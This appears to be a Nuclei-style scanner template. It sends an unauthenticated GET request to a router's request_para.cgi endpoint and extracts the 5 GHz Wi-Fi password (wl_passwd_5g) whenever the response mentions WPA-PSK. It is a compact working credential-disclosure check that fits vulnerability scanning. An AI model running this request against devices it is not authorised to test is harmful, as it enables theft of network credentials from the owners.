http:
- extractors:
  - group: 1
    part: body
    regex:
    - '"wl_passwd_5g":"(.*?)"'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body,"WPA2-PSK") || contains(body,"WPA-PSK")
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/request_para.cgi?parameter=wifi_get_5g_host'
